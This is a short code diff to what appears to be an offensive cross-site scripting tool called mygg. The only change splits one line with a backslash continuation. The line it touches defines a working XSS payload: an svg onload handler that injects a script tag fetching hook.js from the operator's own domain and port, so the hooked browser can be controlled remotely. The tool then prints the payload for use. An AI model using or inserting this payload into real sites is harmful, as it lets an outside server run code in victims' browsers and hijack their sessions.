@@ -225,7 +225,8 @@ function str2json(input) {
 }
 
 /* The payload that downloads mygg */
-var hook = `<svg/onload="var x=document.createElement('script');x.src='//${config.web_domain}:${config.web_port}/hook.js';document.head.appendChild(x);">`
+var hook = `<svg/onload="var x=document.createElement('script');\
+x.src='//${config.web_domain}:${config.web_port}/hook.js';document.head.appendChild(x);">`
 console.log("[+] Payload:\r\n" + hook + "\r\n");
 
 var hook_file = `
